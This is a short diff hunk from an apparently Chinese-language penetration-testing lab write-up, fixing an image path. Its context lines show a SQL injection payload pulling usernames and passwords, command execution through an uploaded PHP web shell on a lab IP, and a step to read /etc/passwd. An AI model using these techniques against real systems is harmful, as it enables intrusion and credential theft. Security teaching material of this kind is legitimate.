@@ -257,7 +257,7 @@ UNION SELECT id，username，password FROM users
 
 1. 查看内核。```http://192.168.56.101/admin/uploads/test.php3?cmd=uname```
 
-![](/Users/xinke/Desktop/工具/shared/ns-chap07/images/cmd1.png)
+![](images/cmd1.png)
 
 2. 查看 /etc/passwd。
 
